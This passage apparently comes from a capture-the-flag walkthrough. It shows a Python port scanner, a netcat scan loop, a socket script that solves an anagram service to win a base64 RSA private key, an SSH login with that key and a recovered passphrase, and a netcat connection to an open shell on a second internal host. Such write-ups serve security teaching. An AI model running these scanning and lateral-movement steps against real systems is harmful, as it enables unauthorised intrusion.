</span><span class='line'><span class="k">def</span> <span class="nf">scan</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">):</span>
</span><span class='line'>  <span class="n">sock</span> <span class="o">=</span> <span class="n">conn</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
</span><span class='line'>  <span class="c">#setdefaulttimeout(1)</span>
</span><span class='line'>  <span class="k">if</span> <span class="n">sock</span><span class="p">:</span>
</span><span class='line'>      <span class="k">print</span><span class="p">(</span><span class="s">&quot;[+] port </span><span class="si">%d</span><span class="s">: open&quot;</span><span class="p">)</span> <span class="o">%</span> <span class="n">port</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span> <span class="n">__name__</span><span class="o">==</span><span class="s">&quot;__main__&quot;</span><span class="p">:</span>
</span><span class='line'>  <span class="k">print</span> <span class="s">&quot;[!] starting...&quot;</span>
</span><span class='line'>  <span class="k">if</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]:</span>
</span><span class='line'>      <span class="k">print</span> <span class="s">&quot;[!] scanning </span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
</span><span class='line'>      <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">65535</span><span class="p">):</span>
</span><span class='line'>          <span class="n">scan</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nb">int</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
</span></code></pre></td></tr></table></div></figure>


<p>Which obviously isn&rsquo;t efficient as:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>celes@dev1:~<span class="nv">$ </span><span class="k">for</span> i in <span class="sb">`</span>seq <span class="m">1</span> 65535<span class="sb">`</span><span class="p">;</span> <span class="k">do</span> nc -z -v 192.168.3.50 <span class="nv">$i</span> 2&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">|</span> grep <span class="s1">&#39;open&#39;</span><span class="p">;</span> <span class="k">done</span>
</span><span class='line'><span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.3.50<span class="o">]</span> <span class="m">22</span> <span class="o">(</span>ssh<span class="o">)</span> open
</span><span class='line'><span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.3.50<span class="o">]</span> <span class="m">1194</span> <span class="o">(</span>openvpn<span class="o">)</span> : Connection refused
</span><span class='line'><span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.3.50<span class="o">]</span> <span class="m">4444</span> <span class="o">(</span>?<span class="o">)</span> open
</span></code></pre></td></tr></table></div></figure>


<p>Let&rsquo;s see what <code>4444</code> has to offer.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>celes@dev1:~<span class="nv">$ </span>nc 192.168.3.50 4444
</span><span class='line'>Hello Celes <span class="p">&amp;</span> Welcome to the Jumble!
</span><span class='line'>
</span><span class='line'>Solve:lrbgaaue
</span><span class='line'>Solve:iahdtsing
</span><span class='line'>Solve:yelpslfrciaiu
</span><span class='line'>Solve:nduyn
</span><span class='line'>Solve:etrdar
</span><span class='line'>Solve:oneantctg
</span><span class='line'>Solve:cnuaditdci
</span><span class='line'>Solve:yhpeltloyipr
</span></code></pre></td></tr></table></div></figure>


<p>Right! This is where I needed <code>.words.txt</code>. The words have been jumbled and we need to return the right words. I wrote a python script for that:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'>
</span><span class='line'><span class="n">wordfile</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">&quot;word&quot;</span><span class="p">,</span> <span class="s">&quot;r&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">words</span> <span class="o">=</span> <span class="n">wordfile</span><span class="o">.</span><span class="n">readlines</span><span class="p">()</span>
</span><span class='line'><span class="n">wordfile</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'><span class="n">lookup</span> <span class="o">=</span> <span class="p">{}</span>
</span><span class='line'>
</span><span class='line'><span class="k">for</span> <span class="n">word</span> <span class="ow">in</span> <span class="n">words</span><span class="p">:</span>
</span><span class='line'>        <span class="n">word</span> <span class="o">=</span> <span class="n">word</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span><span class='line'>        <span class="n">sortedword</span> <span class="o">=</span> <span class="s">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">sorted</span><span class="p">(</span><span class="n">word</span><span class="p">))</span>
</span><span class='line'>        <span class="n">lookup</span><span class="p">[</span><span class="n">sortedword</span><span class="p">]</span> <span class="o">=</span> <span class="n">word</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&quot;192.168.3.50&quot;</span><span class="p">,</span> <span class="nb">int</span><span class="p">(</span><span class="mi">4444</span><span class="p">)))</span>
</span><span class='line'>
</span><span class='line'><span class="n">keepgoing</span> <span class="o">=</span> <span class="mi">1</span>
</span><span class='line'><span class="k">while</span> <span class="p">(</span><span class="n">keepgoing</span><span class="p">):</span>
</span><span class='line'>        <span class="n">c</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">256</span><span class="p">)</span>
</span><span class='line'>        <span class="k">print</span> <span class="n">c</span>
</span><span class='line'>        <span class="k">if</span> <span class="s">&quot;Solve&quot;</span> <span class="ow">in</span> <span class="n">c</span><span class="p">:</span>
</span><span class='line'>                <span class="n">challenge</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">&quot;:&quot;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span><span class='line'>                <span class="n">w</span> <span class="o">=</span> <span class="s">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">sorted</span><span class="p">(</span><span class="n">challenge</span><span class="p">))</span>
</span><span class='line'>                <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">lookup</span><span class="p">[</span><span class="n">w</span><span class="p">])</span>
</span><span class='line'>                <span class="k">print</span> <span class="n">lookup</span><span class="p">[</span><span class="n">w</span><span class="p">]</span>
</span><span class='line'>
</span><span class='line'><span class="nb">raw_input</span><span class="p">()</span>
</span><span class='line'><span class="c"># done</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>There are a couple of funny entries in the wordlist by the way :) Have a look for yourself!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>celes@dev1:~<span class="nv">$ </span>python ./solve.py <span class="p">|</span>more
</span><span class='line'>Hello Celes <span class="p">&amp;</span> Welcome to the Jumble!
</span><span class='line'>
</span><span class='line'>Solve:natlpaearenp
</span><span class='line'>Solve:setmeiercs
</span><span class='line'>Solve:harten
</span><span class='line'>Solve:keasmijnopur
</span><span class='line'>Solve:utefaldzsi
</span><span class='line'>Solve:rlirpaeot
</span><span class='line'>Solve:radret
</span><span class='line'>Solve:ebddnriug
</span><span class='line'>Solve:ludacide
</span><span class='line'>Solve:tdtorheiecc
</span><span class='line'>Solve:vihnac
</span><span class='line'>Solve:dfohyrlnedea
</span><span class='line'>Solve:paisrellufyci
</span><span class='line'>Solve:vnhmrotiunesep
</span><span class='line'>Solve:nrerslemgio
</span><span class='line'>Solve:louficmumr
</span><span class='line'>Solve:ik0mtg1
</span><span class='line'>Solve:mgcaprteiotbn
</span><span class='line'>Solve:snsrsdoeis
</span><span class='line'>Solve:hrssnoeism
</span><span class='line'>Solve:dsfzlateui
</span><span class='line'>Solve:rereenupcs
</span><span class='line'>Solve:mhguespiop
</span><span class='line'>Solve:oipgtcebharae
</span><span class='line'>Solve:jnrpiumkseoa
</span><span class='line'>Solve:iramca
</span><span class='line'>Solve:iigatdsnh
</span><span class='line'>Solve:kmaigiir
</span><span class='line'>Solve:uwhenohgr
</span><span class='line'>Solve:terdar
</span><span class='line'>Solve:rlogacpihgo
</span><span class='line'>Solve:strrpaeer
</span><span class='line'>Solve:sckajbu
</span><span class='line'>Solve:btirhmasin
</span><span class='line'>Solve:bnbghlioo
</span><span class='line'>Solve:litudseafz
</span><span class='line'>Solve:aukripmejnso
</span><span class='line'>Solve:onvmtideinea
</span><span class='line'>Solve:tieabrhacgpeo
</span><span class='line'>Solve:rprsartee
</span><span class='line'>Solve:ernaht
</span><span class='line'>Solve:gplosedcoi
</span><span class='line'>Solve:suzeth
</span><span class='line'>Solve:pgghcilaoro
</span><span class='line'>Solve:ht3cke
</span><span class='line'>Solve:hlbonoibg
</span><span class='line'>Solve:tdrare
</span><span class='line'>Solve:ryud
</span><span class='line'>Solve:radem
</span><span class='line'>Solve:wnuergohh
</span><span class='line'>Solve:rltianuysietv
</span><span class='line'>Solve:dlzuieatsf
</span><span class='line'>Solve:mortiacnae
</span><span class='line'>Solve:tueddnpue
</span><span class='line'>Solve:unynd
</span><span class='line'>Solve:ifumrcouml
</span><span class='line'>Solve:auaeglrb
</span><span class='line'>Solve:cetrmpogiatnb
</span><span class='line'>Solve:idiastssa
</span><span class='line'>Solve:italiernuyvst
</span><span class='line'>
</span><span class='line'>Score: 120
</span><span class='line'>Time: 0.01 secs
</span><span class='line'>You<span class="err">&#39;</span>re a winner
</span><span class='line'>LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpQcm9jLVR5cGU6IDQsRU5DUllQVEVECkRFSy1
</span><span class='line'>JbmZvOiBBRVMtMTI4LUNCQyw3Njg0MTgyMkFCOUU3NzJGRDFENjUzRjYxNzlGMEU0RAoKT3JFTTJvY2
</span><span class='line'>5oSEtnNW51SDdwczFDb09KQ2loYXNtRkpLTE9WTk5ZRk9oR0tVb2pQ
</span><span class='line'>WUV0YTV5T2hJc2tmMGgwcgpTbyt4VkRLNjdHM0RsZ3ltVVYzRHhHZml6TGZadmh4UVJDOFF5MG1mNE4
</span><span class='line'>rbWlZa3ZmMk5hRnRhdHBOY2pLNXBNClV5NlFTRk1PQzhhS3BlMEZMNlVHRFJKUTVHU0c0RGxKckxVSk
</span><span class='line'>JNdm5TTHRZWkhsYVdBSUNLYlhmcFhWNFNUd3YKSjBEOGg5UnRsUkpoTENLNWVLZ3VwWUNRSWlHUVdnM
</span><span class='line'>1B2WnBYazlra2pYaG1P
</span><span class='line'>UXdVWW9DUmwzbDRqNXpsbkZjVApQNlU5VVBoUnEvQ2s0UXJrMmRHeEZmcHBRZDl4VytiNFBXamlTQ2l
</span><span class='line'>rTEYzUTBoZk5OdkVidTRvdW5BZ1l3UEZICmpPWEhKcXhWb2cvcFp6OVk4WGZTUDNoejlBWUhXZkkyaU
</span><span class='line'>M5Q25rN2JvUmNPdittY2dFZVdXa1lyVnNjT2l2WWoKOU4yeGlOcDRHSCtOSUc4bW0vTGRsN2pRTWwvV
</span><span class='line'>nJyNWN4M2ZYak9lem1n
</span><span class='line'>c1NrQVk0Q2NzcHdLc1NYSzhHTC9iTwpoVDZwS1dmTDZVSTh3VWdwSTdLaGdLK0FPS3VTL1hQWVRTZHo
</span><span class='line'>rMFJKeE5GU0xPRk5jalJ0TCtOVzBValBxNUpoCkRpYStwdzVxQitsbGx4Z2FOMFdCUXNrSUZRcHBwUG
</span><span class='line'>93d2pHOEpnOGpKQmpTWWozcjRMSXJad0pTcGN2b0JpVUEKb0NxblFVTXRYbE1oOS9DdkJCR3MxK0pWY
</span><span class='line'>2prSW5CZGU5NDVWK2Vq
</span><span class='line'>aFA2R1BZanU0VFFWN0I3MGQ3YUVXME9FbQowZDduck9XL0xDWXBzVi9ONXJxVnNHbFR2d2pKTm93eU1
</span><span class='line'>xRVo5RTA5Z3VNNWVMNENFUFBtcDlaRGV5MmZCQUd3CnE3blNyOHE2SHNmNGQrWVBSKzkwRWZNSlJlcU
</span><span class='line'>kzczFGUW9UdngrUGFGUGlLdzdkZkhGQ2dMc2NYY1hjb2duTHoKY0IwbG5lbUkrY0ZtZlk3NEYxZVlMM
</span><span class='line'>2Z3Skl3U1JnSzg1WGMy
</span><span class='line'>TXk4c3FKejFpemo2SWxPMmtRMWpMa3JoSk9aOApYK3AvOXc1ekEweDJmYmpwcEhhYytZb0pmeVB5WVh
</span><span class='line'>qa3BpZ0RQakhYaFJpdDJxblVySGZEYzBGamg1QUtOVTJLCk1VL3l3WEdFZzZ3MENwcEs5SkJvMHUveE
</span><span class='line'>psaFQvak9XTmlNNFlaalhsaFF6a3h5ZWJ2YnlSUzZTbGhsbzE0MmwKZ011TVV2UG4xZkFlbmlyNkFGd
</span><span class='line'>3kycmxrdFE1L2E4ejJW
</span><span class='line'>Q3dQa05BNDBNSW1TSE1XUlNGYm9Eak01endyMjRHawpOMHBJMUJDbUNzZjBtc3ZFd0xoZGNWbmhKWTd
</span><span class='line'>CZzRpem01YlgrQXJWL3ltTE9reWJLOGNoejVmcnlYY2plVjFxCml6SmUyQVhaazEvOGhZODB0dkpXan
</span><span class='line'>hVRWZuZ3V5b296UWY1VDc0bW41YWV6OUpnR1dNcXpwZkt3WjZMeDVjVGcKWnUrbStyeWFrQlBGalV0d
</span><span class='line'>DA0bENZQ0NLV1F6UGhn
</span><span class='line'>SXI1eFVGeDYyaENHaGg2Vzh0U0lCNms3SHB1bjEyM0dRMAp1VCtSMEVyWUE1R2R5eDQ0RlpFYXRaM3J
</span><span class='line'>YQ3BWbUpsbENUV1VxQnVhSFlBdGNaVGhUVFpmeFJGSHkwMklUNkZXClBMQ1ovWE4yRStUZHRrWG1GY1
</span><span class='line'>RYUnNndHlBLzVWWHNUV1dtUmNIY3p2NWc1WWNRM3BIczNNaFN4c1dTZFR6LzgKUll6bXhPbkNqWldYY
</span><span class='line'>VVlMFhiN0ZqQS9ldm1w
</span><span class='line'>WHN5aENoR2J2cDBLMGhaRmNNZXN6RkthOEs0cEFlZGN5RzMxbgo0K0hoSW1uRXBMWlFPWGhmWGxrS01
</span><span class='line'>RWHJCeXM3aGtvbmtEcDU3VnFoK0lJWkxHelZtZlRWRWoyV2hjLzBZK0dJCkRNcGgwWnZURytKZ3YxTE
</span><span class='line'>8zU2w4MlJ6bTFqVWt6RUlaTkl4WWVTR3JaZjZDaFZMUGE4NWF4cXc1RVZOQ3hZVWcKSkFxZyt1ZDZ4S
</span><span class='line'>U85b2JpZHh6STJyTGZi
</span><span class='line'>eGNwTXVyODBuYjRjcllNTm0wOXlQUWFza25nSy80SWptblBMZVRpaAotLS0tLUVORCBSU0EgUFJJVkF
</span><span class='line'><span class="nv">URSBLRVktLS0tLQo</span><span class="o">=</span>
</span></code></pre></td></tr></table></div></figure>


<p>Sweet, a prize! Dumping the prize into a file and decoding it yields an RSA key. Probably the one for terra!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>celes@dev1:~<span class="nv">$ </span>cat prize <span class="p">|</span>base64 -d &gt; prize.decoded
</span><span class='line'>celes@dev1:~<span class="nv">$ </span>file prize.decoded
</span><span class='line'>prize.decoded: PEM RSA private key
</span><span class='line'>celes@dev1:~<span class="nv">$ </span>chmod <span class="m">600</span> prize.decoded
</span><span class='line'>celes@dev1:~<span class="nv">$ </span>ssh terra@192.168.3.50 -i ./prize.decoded
</span><span class='line'>Enter passphrase <span class="k">for</span> key <span class="s1">&#39;./prize.decoded&#39;</span>:
</span><span class='line'>Linux dev2 3.2.0-4-amd64 <span class="c">#1 SMP Debian 3.2.60-1+deb7u3 x86_64</span>
</span><span class='line'>
</span><span class='line'>The programs included with the Debian GNU/Linux system are free software<span class="p">;</span>
</span><span class='line'>the exact distribution terms <span class="k">for</span> each program are described in the
</span><span class='line'>individual files in /usr/share/doc/*/copyright.
</span><span class='line'>
</span><span class='line'>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
</span><span class='line'>permitted by applicable law.
</span><span class='line'>You have mail.
</span><span class='line'>Last login: Thu Sep  <span class="m">4</span> 09:18:19 2014
</span><span class='line'>terra@dev2:~<span class="nv">$ </span>
</span></code></pre></td></tr></table></div></figure>


<p>It asks for a passphrase, so I entered <code>Nk9yY31hva8q</code>, recovered from <code>kvasir.jpg</code>. Fourth box! Sure enough, this also will not be the last:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>terra@dev2:~<span class="nv">$ </span>/sbin/ifconfig
</span><span class='line'>eth0      Link encap:Ethernet  HWaddr 8e:63:81:fb:49:5d
</span><span class='line'>          inet addr:192.168.3.50  Bcast:192.168.3.255  Mask:255.255.255.0
</span><span class='line'>          inet6 addr: fe80::8c63:81ff:fefb:495d/64 Scope:Link
</span><span class='line'>          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
</span><span class='line'>          RX packets:7811 errors:0 dropped:0 overruns:0 frame:0
</span><span class='line'>          TX packets:7726 errors:0 dropped:0 overruns:0 carrier:0
</span><span class='line'>          collisions:0 txqueuelen:1000
</span><span class='line'>          RX bytes:603633 <span class="o">(</span>589.4 KiB<span class="o">)</span>  TX bytes:460447 <span class="o">(</span>449.6 KiB<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>eth1      Link encap:Ethernet  HWaddr de:a7:30:97:c9:7d
</span><span class='line'>          inet addr:192.168.4.50  Bcast:192.168.4.255  Mask:255.255.255.0
</span><span class='line'>          inet6 addr: fe80::dca7:30ff:fe97:c97d/64 Scope:Link
</span><span class='line'>          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
</span><span class='line'>          RX packets:156 errors:0 dropped:0 overruns:0 frame:0
</span><span class='line'>          TX packets:35 errors:0 dropped:0 overruns:0 carrier:0
</span><span class='line'>          collisions:0 txqueuelen:1000
</span><span class='line'>          RX bytes:32315 <span class="o">(</span>31.5 KiB<span class="o">)</span>  TX bytes:2958 <span class="o">(</span>2.8 KiB<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>Looks like there is another host somewhere in <code>192.168.4.1/24</code> waiting for me. After pinging, I found <code>192.168.4.100</code>. A first portscan showed nothing besides the usual, but a second one gave me something:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>terra@dev2:~<span class="nv">$ </span>python portscan.py 192.168.4.100
</span><span class='line'><span class="o">[</span>!<span class="o">]</span> starting...
</span><span class='line'><span class="o">[</span>!<span class="o">]</span> scanning 192.168.4.100
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> port 22: open
</span><span class='line'>terra@dev2:~<span class="nv">$ </span>python portscan.py 192.168.4.100
</span><span class='line'><span class="o">[</span>!<span class="o">]</span> starting...
</span><span class='line'><span class="o">[</span>!<span class="o">]</span> scanning 192.168.4.100
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> port 22: open
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> port 1111: open
</span></code></pre></td></tr></table></div></figure>


<p>Port 1111 is open on the fifth box. Connecting to it seems to yield a shell as <code>locke</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>terra@dev2:~<span class="nv">$ </span>nc 192.168.4.100 1111
</span><span class='line'><span class="nv">$ </span>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>locke<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>locke<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>locke<span class="o">)</span>
</span><span class='line'><span class="nv">$ </span>whoami
</span><span class='line'>locke
</span><span class='line'><span class="nv">$ </span><span class="nb">cd</span> /home
</span><span class='line'><span class="nv">$ </span>ls -alh
</span><span class='line'>total 16K
</span><span class='line'>drwxr-xr-x  <span class="m">4</span> root  root  4.0K Aug <span class="m">13</span> 14:19 .
</span><span class='line'>drwxr-xr-x <span class="m">22</span> root  root  4.0K Aug  <span class="m">9</span> 15:38 ..
</span><span class='line'>drwxrwx---  <span class="m">2</span> kefka kefka 4.0K Sep <span class="m">27</span> 21:22 kefka
</span><span class='line'>drwxrwx---  <span class="m">2</span> locke locke 4.0K Sep  <span class="m">4</span> 13:38 locke
</span><span class='line'><span class="nb">cd </span>locke
</span><span class='line'>ls -al
</span><span class='line'>total 352
</span><span class='line'>drwxrwx--- <span class="m">2</span> locke locke   <span class="m">4096</span> Sep  <span class="m">4</span> 13:38 .
</span><span class='line'>drwxr-xr-x <span class="m">4</span> root  root    <span class="m">4096</span> Aug <span class="m">13</span> 14:19 ..
</span><span class='line'>-rw------- <span class="m">1</span> locke locke      <span class="m">0</span> Sep  <span class="m">4</span> 10:05 .bash_history
</span><span class='line'>-rw-r--r-- <span class="m">1</span> locke locke    <span class="m">220</span> Dec <span class="m">30</span>  <span class="m">2012</span> .bash_logout
</span><span class='line'>-rw-r--r-- <span class="m">1</span> locke locke   <span class="m">3392</span> Dec <span class="m">30</span>  <span class="m">2012</span> .bashrc
</span><span class='line'>-rw-r--r-- <span class="m">1</span> locke locke    <span class="m">675</span> Dec <span class="m">30</span>  <span class="m">2012</span> .profile
</span><span class='line'>-rw------- <span class="m">1</span> locke locke      <span class="m">0</span> Sep <span class="m">27</span> 21:37 .viminfo
</span><span class='line'>-rw-r--r-- <span class="m">1</span> locke locke <span class="m">329498</span> Aug <span class="m">10</span> 10:32 diskimage.tar.gz
</span><span class='line'>-rwxr--r-- <span class="m">1</span> locke locke     <span class="m">42</span> Aug <span class="m">13</span> 17:59 littleShell.sh
</span><span class='line'>-rw-r--r-- <span class="m">1</span> locke locke    <span class="m">110</span> Sep  <span class="m">4</span> 13:38 note.txt
</span><span class='line'><span class="nv">$ </span>cat note.txt
</span><span class='line'>Looks like Kefka may have been abusing our removable media policy.  I<span class="err">&#39;</span>ve extracted this image to have a look.
</span></code></pre></td></tr></table></div></figure>


<p>That <code>diskimage.tar.gz</code> looks interesting. I copied it over to my box and unpacked it. It was, unsurprisingly, a disk image, containing <code>Secret.rar</code>. Furthermore, the disk image seemed to be mostly empty. However, browsing through it using a hex-editor, it had one deleted file! The file looked like it used to be a .WAV file. I recovered it:</p>

